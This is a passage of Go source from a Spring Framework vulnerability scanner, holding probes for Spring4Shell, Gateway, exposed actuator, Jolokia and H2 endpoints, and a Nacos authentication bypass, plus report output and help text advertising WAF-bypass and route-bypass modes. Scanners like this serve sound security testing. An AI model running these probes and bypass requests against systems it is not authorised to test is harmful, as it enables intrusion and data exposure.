		if strings.Contains(string(body404), "Whitelabel Error Page") {
			isSpring = true
		}
	}

	// 检测X-Application-Context头
	req0, _ := http.NewRequestWithContext(ctx, "GET", baseURL, nil)
	setRequestHeaders(req0, "")
	resp0, err := client.Do(req0)
	if err != nil {
		return
	}
	body0, _ := io.ReadAll(io.LimitReader(resp0.Body, 10240))
	resp0.Body.Close()

	for k := range resp0.Header {
		if strings.Contains(strings.ToLower(k), "x-application-context") {
			isSpring = true
			break
		}
	}

	if !isSpring {
		return
	}

	baseLen := len(body0)

	// 测试classLoader参数
	testURL := baseURL + "?class.module.classLoader.resources.context.parent.pipeline.first.pattern=x"
	req1, _ := http.NewRequestWithContext(ctx, "GET", testURL, nil)
	setRequestHeaders(req1, "")

	resp1, err := client.Do(req1)
	if err != nil {
		return
	}
	body1, _ := io.ReadAll(io.LimitReader(resp1.Body, 10240))
	resp1.Body.Close()

	// 检测: Spring应用且返回200且响应长度相近
	if resp1.StatusCode == 200 && resp0.StatusCode == 200 {
		lenDiff := len(body1) - baseLen
		if lenDiff >= -10 && lenDiff <= 100 {
			reportVuln(VulnResult{
				CVE:         "CVE-2022-22965",
				Name:        "Spring4Shell RCE",
				Severity:    "CRITICAL",
				URL:         baseURL,
				Details:     "classLoader parameter silently accepted",
				Remediation: "Upgrade to Spring 5.3.18+ or Spring Boot 2.6.6+",
			})
		}
	}
}

func checkGatewayRCE(ctx context.Context, client *http.Client, baseURL string) {
	targetURL := baseURL + "actuator/gateway/routes"
	req, _ := http.NewRequestWithContext(ctx, "GET", targetURL, nil)
	setRequestHeaders(req, "")

	resp, err := client.Do(req)
	if err != nil {
		return
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 20480))
	resp.Body.Close()

	if resp.StatusCode == 200 && strings.Contains(string(body), "predicates") {
		reportVuln(VulnResult{CVE: "CVE-2022-22947", Name: "Gateway RCE", Severity: "CRITICAL", URL: targetURL, Details: "Gateway routes exposed", Remediation: "Upgrade Gateway to 3.1.1+"})
	}
}

func checkActuatorEnvRCE(ctx context.Context, client *http.Client, baseURL string) {
	targetURL := baseURL + "actuator/env"
	req, _ := http.NewRequestWithContext(ctx, "GET", targetURL, nil)
	setRequestHeaders(req, "")

	resp, err := client.Do(req)
	if err != nil {
		return
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 10240))
	resp.Body.Close()

	if resp.StatusCode == 200 && strings.Contains(string(body), "propertySources") {
		reportVuln(VulnResult{CVE: "N/A", Name: "Actuator Env Leak", Severity: "HIGH", URL: targetURL, Details: "Environment config exposed", Remediation: "Disable or protect actuator endpoints"})
	}
}

func checkJolokiaRCE(ctx context.Context, client *http.Client, baseURL string) {
	targetURL := baseURL + "actuator/jolokia/list"
	req, _ := http.NewRequestWithContext(ctx, "GET", targetURL, nil)
	setRequestHeaders(req, "")

	resp, err := client.Do(req)
	if err != nil {
		return
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 102400))
	resp.Body.Close()

	if resp.StatusCode == 200 && strings.Contains(string(body), "jolokia") {
		reportVuln(VulnResult{CVE: "N/A", Name: "Jolokia RCE", Severity: "CRITICAL", URL: targetURL, Details: "Jolokia endpoint exposed", Remediation: "Disable Jolokia"})
	}
}

func checkH2ConsoleRCE(ctx context.Context, client *http.Client, baseURL string) {
	targetURL := baseURL + "h2-console"
	req, _ := http.NewRequestWithContext(ctx, "GET", targetURL, nil)
	setRequestHeaders(req, "")

	resp, err := client.Do(req)
	if err != nil {
		return
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 10240))
	resp.Body.Close()

	if resp.StatusCode == 200 && strings.Contains(string(body), "H2") {
		reportVuln(VulnResult{CVE: "N/A", Name: "H2 Console RCE", Severity: "CRITICAL", URL: targetURL, Details: "H2 database console exposed", Remediation: "Disable H2 console"})
	}
}

func checkNacosAuthBypass(ctx context.Context, client *http.Client, baseURL string) {
	targetURL := baseURL + "nacos/v1/auth/users?pageNo=1&pageSize=9"
	req, _ := http.NewRequestWithContext(ctx, "GET", targetURL, nil)
	req.Header.Set("User-Agent", "Nacos-Server")
	setRequestHeaders(req, "")

	resp, err := client.Do(req)
	if err != nil {
		return
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 10240))
	resp.Body.Close()

	if resp.StatusCode == 200 && strings.Contains(string(body), "username") {
		reportVuln(VulnResult{CVE: "CVE-2021-29441", Name: "Nacos Auth Bypass", Severity: "CRITICAL", URL: targetURL, Details: "Authentication bypassed via User-Agent", Remediation: "Upgrade Nacos"})
	}
}

// ==================== 输出 ====================

func printFinalSummary() {
	elapsed := time.Since(stats.StartTime)

	fmt.Println()
	fmt.Println(strings.Repeat("=", 60))
	cyan.Println("[*] Scan Summary")
	fmt.Printf("    Duration:   %v\n", elapsed.Round(time.Millisecond))
	fmt.Printf("    Targets:    %d\n", stats.TargetsScanned)
	fmt.Printf("    Requests:   %d\n", stats.TotalRequests)
	fmt.Printf("    Success:    %d\n", stats.SuccessRequests)

	if stats.SensitiveFound > 0 {
		yellow.Printf("    Sensitive:  %d\n", stats.SensitiveFound)
	}
	if stats.VulnsFound > 0 {
		red.Printf("    Vulns:      %d\n", stats.VulnsFound)
	}
	if len(heapFindings) > 0 {
		red.Printf("    Heap Items: %d\n", len(heapFindings))
	}

	fmt.Println()
}

func saveJSONReport() {
	report := map[string]any{
		"version":   Version,
		"scan_time": time.Now().Format(time.RFC3339),
		"stats":     map[string]int64{"targets": stats.TargetsScanned, "requests": stats.TotalRequests, "vulns": stats.VulnsFound},
		"results":   targetResults,
	}
	jsonData, _ := json.MarshalIndent(report, "", "  ")
	os.WriteFile(config.OutputFile, jsonData, 0644)
	green.Printf("[+] JSON report saved: %s\n", config.OutputFile)
}

func saveHTMLReport() {
	htmlTemplate := `<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>FuckSpringScan Report</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:monospace;background:#1e1e1e;color:#d4d4d4;padding:20px}
.container{max-width:1200px;margin:0 auto}h1{color:#569cd6;margin-bottom:20px}h2{color:#ce9178;margin:20px 0 10px}
.vuln{background:#2d2d2d;border-left:4px solid #f44;padding:15px;margin:10px 0}
.vuln.high{border-color:#fa0}.endpoint{padding:5px 0;border-bottom:1px solid #333}
.sensitive{color:#f44}.success{color:#6a9955}</style></head>
<body><div class="container"><h1>FuckSpringScan v{{.Version}}</h1><p>Scan Time: {{.ScanTime}}</p>
<p>Targets: {{.Stats.Targets}} | Requests: {{.Stats.Requests}} | Vulns: {{.Stats.Vulns}}</p>
{{if .AllVulns}}<h2>Vulnerabilities</h2>{{range .AllVulns}}
<div class="vuln"><strong>[{{.Severity}}] {{.Name}}</strong><br>URL: {{.URL}}<br>{{.Details}}<br>Fix: {{.Remediation}}</div>{{end}}{{end}}
{{range .Results}}<h2>{{.URL}}</h2>
{{range .Endpoints}}{{if .IsSensitive}}<div class="endpoint sensitive">[+] {{.URL}} [{{.StatusCode}}] - {{.VulnType}}</div>{{end}}{{end}}
{{end}}</div></body></html>`

	var allVulns []VulnResult
	for _, r := range targetResults {
		allVulns = append(allVulns, r.Vulns...)
	}

	data := map[string]any{
		"Version": Version, "ScanTime": time.Now().Format("2006-01-02 15:04:05"),
		"Stats":    map[string]int64{"Targets": stats.TargetsScanned, "Requests": stats.TotalRequests, "Vulns": stats.VulnsFound},
		"AllVulns": allVulns, "Results": targetResults,
	}

	tmpl, _ := template.New("report").Parse(htmlTemplate)
	file, _ := os.Create(config.HTMLReport)
	defer file.Close()
	tmpl.Execute(file, data)

	absPath, _ := filepath.Abs(config.HTMLReport)
	green.Printf("[+] HTML report saved: %s\n", absPath)
}

func Banner() {
	cyan.Println(`
  _____         _     ___         _           ___
 |   __|_ _ ___| |_  |_ _|___ ___|_|___ ___  |_ _|___ ___ ___
 |   __| | |  _| '_|  | ||   |_ -| | . |   |  | ||   |  _|   |
 |__|  |___|___|_,_| |___|_|_|___|_|___|_|_| |___|_|_|_| |_|_|

  FuckSpringScan v` + Version + ` - Spring Framework Scanner
  By: J1sTeam | github.com/JishiTeam-J1wa
`)

	fmt.Printf("  Endpoints: %d | WAF Bypass: %d | Semantic: %d | Route: %d\n\n",
		len(actuatorEndpoints)+len(swaggerEndpoints)+len(druidEndpoints),
		len(wafBypassPayloads), len(semanticBypassPayloads), len(routeBypassPayloads))
}

func printHelp() {
	fmt.Println(`
Usage: FuckSpringScan [options]

Target:
  -u <URL>           Target URL
  -f <file>          File with URLs (one per line)

Scan Modes:
  -poc               Enable vulnerability checks
  -bypass            Enable route bypass
  -ghost             Enable ghost byte bypass
  -deep              Deep scan mode
  -heap              Analyze heapdump files

Smart Bypass:
  -bypassall <path>  Try all bypass techniques on path
                     Example: -u https://target.com -bypassall actuator/env

Output:
  -o <file>          Save JSON report
  -html <file>       Save HTML report
  -v                 Verbose output

Options:
  -t <num>           Threads (default: 30)
  -timeout <sec>     Timeout (default: 10)
  -proxy <url>       HTTP proxy
  -cookie <cookie>   Cookie header
  -H <header>        Custom header

Examples:
  ./FuckSpringScan -u https://target.com -poc
  ./FuckSpringScan -u https://target.com -bypassall actuator/env
  ./FuckSpringScan -f targets.txt -bypass -poc -html report.html
`)
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n-3] + "..."
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func base64Encode(s string) string {
	return base64.StdEncoding.EncodeToString([]byte(s))
}
